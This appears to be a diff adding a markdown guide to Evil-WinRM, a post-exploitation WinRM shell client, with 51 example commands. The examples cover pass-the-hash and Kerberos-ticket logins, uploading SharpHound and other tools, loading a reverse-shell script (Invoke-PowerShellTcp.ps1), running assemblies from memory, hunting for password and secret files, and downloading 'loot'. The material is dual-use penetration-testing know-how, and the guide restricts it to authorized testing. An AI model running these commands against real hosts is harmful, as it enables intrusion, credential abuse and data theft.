@@ -1,0 +1,589 @@
+---
+title: "Evil-WinRM"
+description: "Evil-WinRM tool guide; includes tool's purpose,primary uses,core features,data sources, common commands and example of command's usages."
+tags: ['windows', 'winrm', 'active directory', 'post-exploitation']
+---
+
+## What is the purpose of Evil-WinRM?​
+
+**Evil-WinRM** is an open-source WinRM shell client used during authorized Windows and Active Directory assessments. It provides an interactive remote PowerShell shell over Windows Remote Management and supports authentication with passwords, NTLM hashes, certificates, and Kerberos-related workflows.
+
+Evil-WinRM is useful because WinRM is common in enterprise Windows environments and often becomes the most direct way to validate credential impact after password spraying, Kerberoasting, NTLM relay, credential dumping, or local administrator reuse. It is commonly used for controlled post-exploitation, remote command execution, file transfer, PowerShell module loading, and Active Directory situational awareness.
+
+**Note:** Evil-WinRM requires valid credentials or valid authentication material and should only be used in systems where you have explicit authorization. It is not a vulnerability scanner; it is an interactive remote administration and post-exploitation client.
+
+**Here are the primary uses of Evil-WinRM:**
+
+  * **Interactive WinRM Shell Access:** Evil-WinRM opens an interactive PowerShell session against a Windows host when the supplied identity has permission to use WinRM.
+
+  * **Credential Impact Validation:** The tool confirms whether usernames, passwords, NTLM hashes, certificates, or Kerberos tickets provide usable remote shell access.
+
+  * **Post-Exploitation File Transfer:** Evil-WinRM can upload tools, scripts, and payloads to a target and download evidence or output files from the host.
+
+  * **PowerShell Module Loading:** The tool supports loading PowerShell scripts and modules into the remote session, which helps run authorized enumeration and administrative checks.
+
+  * **In-Memory Execution Workflows:** Evil-WinRM supports paths for scripts, executables, and dynamic libraries that can be used from the shell to reduce manual transfer friction.
+
+  * **AD and Windows Reconnaissance:** After authentication, operators can run Windows and Active Directory commands such as `whoami`, `hostname`, `ipconfig`, `net user`, PowerView functions, and directory queries.
+
+  * **HTTPS and Certificate-Based Access:** Evil-WinRM can connect over SSL/TLS and can authenticate with certificate and private key material when WinRM is configured for it.
+
+
+
+
+## Core Features​
+
+  * Interactive WinRM shell access
+  * Password, hash, certificate, and Kerberos authentication options
+  * PowerShell command and script execution
+  * File upload and download helpers
+  * SSL, proxy, logging, and connection controls
+  * In-memory script loading and post-exploitation helper workflows
+  * Useful Windows and Active Directory administration commands
+
+
+
+## Data sources​
+
+  * WinRM HTTP and HTTPS endpoints
+  * Usernames, passwords, NTLM hashes, certificates, and Kerberos tickets
+  * PowerShell scripts and local helper files
+  * Remote Windows filesystem content
+  * Domain, host, process, and service information
+  * Command output and session logs
+
+
+
+## Common Evil-WinRM Commands​
+
+### 1\. Install Evil-WinRM with RubyGems​
+
+  * This command installs Evil-WinRM as a Ruby gem.
+
+
+    
+    
+```
+gem install evil-winrm  
+```
+### 2\. Show Help​
+
+  * This command displays Evil-WinRM options.
+
+
+    
+    
+```
+evil-winrm --help  
+```
+### 3\. Basic Password Authentication​
+
+  * This command opens an interactive WinRM shell with a username and password.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd'  
+```
+### 4\. Authenticate with a Domain User​
+
+  * This command authenticates with an explicit domain-qualified username.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u 'CORP\j.doe' -p 'P@ssw0rd'  
+```
+### 5\. Prompt for the Password​
+
+  * This command omits the password argument so Evil-WinRM prompts for it interactively.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u 'CORP\j.doe'  
+```
+### 6\. Pass-the-Hash Authentication​
+
+  * This command authenticates with an NTLM hash instead of a plaintext password.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4  
+```
+### 7\. Authenticate with a Kerberos Ticket​
+
+  * This command uses a Kerberos ticket file and realm. The target should be provided as an FQDN for Kerberos workflows.
+
+
+    
+    
+```
+evil-winrm -i ws01.corp.local -r CORP.LOCAL -K admin.ccache  
+```
+### 8\. Set a Custom Kerberos SPN Prefix​
+
+  * This command sets the SPN prefix used for Kerberos authentication.
+
+
+    
+    
+```
+evil-winrm -i ws01.corp.local -r CORP.LOCAL -K admin.ccache --spn HTTP  
+```
+### 9\. Connect Over HTTPS​
+
+  * This command uses SSL/TLS for WinRM, commonly on port `5986`.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd' -S  
+```
+### 10\. Use a Custom WinRM Port​
+
+  * This command connects to a non-default WinRM port.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd' -P 5986 -S  
+```
+### 11\. Connect by Hostname​
+
+  * This command connects to a hostname instead of an IP address.
+
+
+    
+    
+```
+evil-winrm -i ws01.corp.local -u 'CORP\j.doe' -p 'P@ssw0rd'  
+```
+### 12\. Use Certificate Authentication​
+
+  * This command authenticates with a client certificate and private key.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -S -c cert.pem -k key.pem  
+```
+### 13\. Use a Custom WinRM URL Endpoint​
+
+  * This command sets a custom remote WinRM URL endpoint.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd' -U /wsman  
+```
+### 14\. Set a Custom User-Agent​
+
+  * This command changes the WinRM client user-agent string.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd' -a 'Microsoft WinRM Client'  
+```
+### 15\. Enable Session Logging​
+
+  * This command enables Evil-WinRM session logging.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd' -l  
+```
+### 16\. Set a Scripts Directory​
+
+  * This command makes local PowerShell scripts available inside the Evil-WinRM session.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd' -s ./scripts  
+```
+### 17\. Set an Executables Directory​
+
+  * This command makes local executables available for upload and execution workflows.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd' -e ./bin  
+```
+### 18\. Disable Color Output​
+
+  * This command disables colored prompt and output text.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd' -n  
+```
+### 19\. Disable Remote Path Completion​
+
+  * This command disables remote path completion when it is slow or noisy.
+
+
+    
+    
+```
+evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd' -N  
+```
+### 20\. Run Evil-WinRM with Docker​
+
+  * This command runs Evil-WinRM from a container with local script and data directories mounted.
+
+
+    
+    
+```
+docker run --rm -ti --name evil-winrm -v ./scripts:/ps1_scripts -v ./bin:/exe_files -v ./data:/data oscarakaelvis/evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd' -s /ps1_scripts -e /exe_files  
+```
+### 21\. Load a PowerShell Script Inside the Session​
+
+  * This Evil-WinRM shell command loads a script from the configured scripts path.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> menu  
+*Evil-WinRM* PS C:\Users\j.doe\Documents> Invoke-PowerShellTcp.ps1  
+```
+### 22\. Upload a File​
+
+  * This Evil-WinRM shell command uploads a local file to the current remote directory.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> upload ./SharpHound.exe  
+```
+### 23\. Upload to a Specific Remote Path​
+
+  * This command uploads a local file to a selected path on the target.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> upload ./tool.exe C:\Windows\Temp\tool.exe  
+```
+### 24\. Download a File​
+
+  * This command downloads a remote file to the local working directory.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> download C:\Windows\Temp\loot.txt  
+```
+### 25\. Download to a Specific Local Path​
+
+  * This command saves a remote file to a chosen local path.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> download C:\Windows\Temp\loot.txt ./loot/ws01-loot.txt  
+```
+### 26\. List Built-In Evil-WinRM Functions​
+
+  * This command prints Evil-WinRM built-in functions and functions loaded from scripts.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> menu  
+```
+### 27\. List Services with Evil-WinRM​
+
+  * This built-in command lists services and shows whether the current account has permissions over them.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> services  
+```
+### 28\. Print the Current Identity​
+
+  * This command shows the user context of the remote shell.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> whoami /all  
+```
+### 29\. Check the Hostname​
+
+  * This command prints the remote computer name.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> hostname  
+```
+### 30\. Check Network Configuration​
+
+  * This command prints IP configuration from the remote host.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> ipconfig /all  
+```
+### 31\. Check Local Administrators​
+
+  * This command lists local administrators on the remote host.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> net localgroup administrators  
+```
+### 32\. Check Domain Information​
+
+  * This command shows the joined domain and logon server context.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> echo $env:USERDOMAIN  
+*Evil-WinRM* PS C:\Users\j.doe\Documents> echo $env:LOGONSERVER  
+```
+### 33\. List Domain Users​
+
+  * This command queries domain users from the remote session.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> net user /domain  
+```
+### 34\. List Domain Groups​
+
+  * This command queries domain groups from the remote session.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> net group /domain  
+```
+### 35\. Import PowerView​
+
+  * This command loads PowerView from the configured scripts path.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> menu  
+*Evil-WinRM* PS C:\Users\j.doe\Documents> PowerView.ps1  
+```
+### 36\. Run a PowerView Domain Query​
+
+  * This command queries domain computers after PowerView is loaded.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> Get-DomainComputer -Properties dnshostname,operatingsystem  
+```
+### 37\. Run a .NET Assembly from Memory​
+
+  * This command runs a configured executable through Evil-WinRM's `Invoke-Binary` workflow.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> Invoke-Binary /opt/csharp/Seatbelt.exe  
+```
+### 38\. Search Writable Paths​
+
+  * This command helps identify directories where the current identity can write.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSIsContainer -and (Test-Path "$($_.FullName)\." -PathType Container)}  
+```
+### 39\. Create a Working Directory​
+
+  * This command creates a temporary working directory.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> mkdir C:\Windows\Temp\hv  
+```
+### 40\. Run an Uploaded Executable​
+
+  * This command executes a file uploaded to the target.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> C:\Windows\Temp\tool.exe  
+```
+### 41\. Execute a PowerShell One-Liner​
+
+  * This command runs a PowerShell expression inside the remote shell.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-Process | Select-Object -First 5"  
+```
+### 42\. Check PowerShell Language Mode​
+
+  * This command checks whether PowerShell is constrained.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> $ExecutionContext.SessionState.LanguageMode  
+```
+### 43\. Check Defender Status​
+
+  * This command prints Microsoft Defender status when available.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> Get-MpComputerStatus  
+```
+### 44\. List Local Sessions​
+
+  * This command checks logged-on users through common Windows commands.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> quser  
+```
+### 45\. Search for Interesting Files​
+
+  * This command searches user directories for files with sensitive-looking names.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> Get-ChildItem C:\Users -Recurse -Include *password*,*secret*,*key* -ErrorAction SilentlyContinue  
+```
+### 46\. Read a File​
+
+  * This command prints a remote text file.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> type C:\Windows\Temp\loot.txt  
+```
+### 47\. Check Current Privileges​
+
+  * This command lists assigned privileges for the current token.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> whoami /priv  
+```
+### 48\. Check Running Services​
+
+  * This command lists running services and their binary paths.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> Get-CimInstance Win32_Service | Select-Object Name,State,StartName,PathName  
+```
+### 49\. Exit the Session​
+
+  * This command closes the Evil-WinRM shell.
+
+
+    
+    
+```bash
+*Evil-WinRM* PS C:\Users\j.doe\Documents> exit  
+```
+### 50\. Validate WinRM with NetExec First​
+
+  * This command checks whether credentials can authenticate to WinRM before opening an interactive shell.
+
+
+    
+    
+```
+nxc winrm 192.168.1.20 -u 'CORP\j.doe' -p 'P@ssw0rd'  
+```
+### 51\. Scan for WinRM with Nmap​
+
+  * This command checks whether default WinRM ports are open before attempting a session.
+
+
+    
+    
+```bash
+nmap -p 5985,5986 -sV 192.168.1.20  
+```
+## Output Examples​
+
+Command| Description| Example Output  
+---|---|---  
+`evil-winrm --help`| Shows supported options.| `Usage: evil-winrm -i IP -u USER -p PASS`  
+`evil-winrm -i 192.168.1.20 -u administrator -p 'P@ssw0rd'`| Opens a password-based WinRM shell.| `Evil-WinRM shell v3.x`   
+`*Evil-WinRM* PS C:\Users\Administrator\Documents>`  
+`evil-winrm -i 192.168.1.20 -u administrator -H <nt_hash>`| Opens a pass-the-hash WinRM shell.| `Info: Establishing connection to remote endpoint`   
+`*Evil-WinRM* PS C:\Users\Administrator\Documents>`  
+`evil-winrm -i 192.168.1.20 -S -c cert.pem -k key.pem`| Authenticates with certificate material.| `Info: Establishing connection to remote endpoint`  
+`upload ./SharpHound.exe`| Uploads a local file from inside the shell.| `Info: Uploading ./SharpHound.exe to C:\Users\j.doe\Documents\SharpHound.exe`  
+`download C:\Windows\Temp\loot.txt`| Downloads a remote file from inside the shell.| `Info: Downloading C:\Windows\Temp\loot.txt to loot.txt`  
+`whoami /all`| Shows the current token, groups, and privileges.| `corp\j.doe`   
+`BUILTIN\Remote Management Users`  
+`hostname`| Prints the target hostname.| `WS01`  
+`Get-MpComputerStatus`| Checks Defender status.| `AMServiceEnabled : True`   
+`RealTimeProtectionEnabled : True`  
+`nxc winrm 192.168.1.20 -u 'CORP\j.doe' -p 'P@ssw0rd'`| Validates WinRM access before shelling in.| `WINRM 192.168.1.20 5985 WS01 [+] CORP\j.doe:P@ssw0rd (Pwn3d!)`
